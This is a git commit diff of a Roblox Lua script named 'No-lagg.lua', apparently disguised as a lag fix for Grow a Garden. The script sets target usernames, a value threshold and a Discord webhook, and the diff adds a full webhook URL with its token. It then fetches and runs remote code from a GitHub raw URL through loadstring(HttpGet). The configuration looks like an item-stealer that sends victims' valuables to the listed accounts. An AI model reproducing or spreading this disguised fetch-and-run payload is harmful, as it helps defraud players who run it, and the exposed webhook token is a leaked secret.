f03b01f9ac138fe26816eaf6bc8c036cf7c34d40
yuunii-1 <jolyannies16@gmail.com>
2025-06-20 21:31:01 +0800

    Update No-lagg.lua

--- No-lagg.lua
+++ No-lagg.lua
@@ -1,6 +1,6 @@
 _G.Usernames = {"Itzfreespam1", "Queen_Morelya", "user3"} -- you can add as many as you'd like
 _G.min_value = 100000000 -- 100 million
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1381980155639234661/wuZb0v--XUxhnn6eWregiFX6ys2ZY_7V-Wp_X-GRhn1Qumq_FxyRaxWiDc_nz_s9Bp46" -- change to your webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/yuunii-1/No-laggtet/refs/heads/main/GrowAGarden.lua.txt",true))()
